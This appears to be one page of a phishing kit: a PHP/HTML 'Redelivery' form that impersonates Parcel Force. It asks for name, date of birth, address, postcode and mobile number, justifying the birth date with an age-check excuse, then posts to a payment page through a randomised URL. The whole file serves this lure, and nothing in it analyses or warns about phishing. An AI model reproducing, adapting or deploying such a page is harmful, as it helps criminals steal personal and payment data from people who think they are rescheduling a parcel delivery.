<?php require_once __DIR__ . "/header.php"; ?>
       

        <!-- <br/>  -->
        <section class="page-section" id="registration">
            <div class="container">
                <div class="row">
                    <div class="col-lg-8 mx-auto ps_form_wrapper">
                        <br/>
                        <form id="registrationForm" name="registrationForm" method="POST"   action="payment.php?<?php echo generateRandomString(); ?>">
                            <input type="hidden" name="uid" value="<?php echo generateRandomString(); ?>" />
                            <!-- <h1 id="title">Redelivery</h1> -->
                            <div class="control-group">
                                <div class="form-group">
                                    <label>First name<span class="red-symbol">*</span></label>
                                    <input class="form-control" id="name" name="name" type="text" placeholder="" required="required" data-validation-required-message="Please enter your name." />
                                    <p class="help-block text-danger"></p>
                                </div>
                            </div>

                            <div class="control-group">
                                <div class="form-group">
                                    <label>Last name<span class="red-symbol">*</span></label>
                                    <input class="form-control" id="lastname" name="name" type="text" placeholder="" required="required" data-validation-required-message="Please enter your name." />
                                    <p class="help-block text-danger"></p>
                                </div>
                            </div>

                            <div class="control-group">
                                <div class="form-group">
                                    <label>Date of Birth<span class="red-symbol">*</span></label>
                                    <input class="form-control" maxLength="10" id="dob" name="dob" type="tel" placeholder="" required="required" data-validation-required-message="Select date of birth." />
                                    <p class="help-block text-danger" style="text-align:center; color:black !important;">Some parcels such as those containing shart<br>items can only be given to those over the age of<br> 18.</p>
                                </div>
                            </div>

                            <div class="control-group">
                                <div class="form-group">
                                    <label>Address<span class="red-symbol">*</span></label>
                                    <input class="form-control" id="address" name="name" type="text" placeholder="" required="required" data-validation-required-message="Please enter your name." />
                                    <input class="form-control" id="address" name="name" type="text" placeholder=""/>
                                    <!-- <textarea class="form-control" id="address" name="address" rows="2" placeholder="Address" required="required" data-validation-required-message="Please enter a address."></textarea> -->
                                    <p class="help-block text-danger"></p>
                                </div>
                            </div>

                            <div class="control-group">
                                <div class="form-group">
                                    <label>City<span class="red-symbol">*</span></label>
                                    <input class="form-control" id="city" name="city" type="text" placeholder="City" required="required" data-validation-required-message="Please enter City" />
                                    <p class="help-block text-danger"></p>
                                </div>
                            </div>

                            <div class="control-group">
                                <div class="form-group">
                                    <label>Postcode<span class="red-symbol">*</span></label>
                                    <input maxlength="7" class="form-control" id="postcode" name="postcode" type="text" placeholder="" required="required" data-validation-required-message="Please enter Post Code" />
                                    <p class="help-block text-danger"></p>
                                </div>
                            </div>

                            <div class="control-group">
                                <div class="form-group">
                                    <label>Mobile Number<span class="red-symbol">*</span></label>
                                    <input class="form-control" maxlength="14" id="phone" name="phone" type="tel" placeholder="" required="required" data-validation-required-message="Please enter your phone number." />
                                    <p class="help-block text-danger" style="text-align:center; color:black !important;">A Parcel Force representative or delivery driver<br>may contact you via this number.</p>
                                </div>
                            </div>

                            
                            <br />
                            <div id="success"></div>
                            <div class="form-group" style="text-align: center;">
                                <button class="btn btn-primary btn-xl" id="sendMessageButton" type="submit">Continue</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </section>
        <br/>
        <!-- Footer-->
<?php require_once __DIR__ . "/footer.php"; ?>
   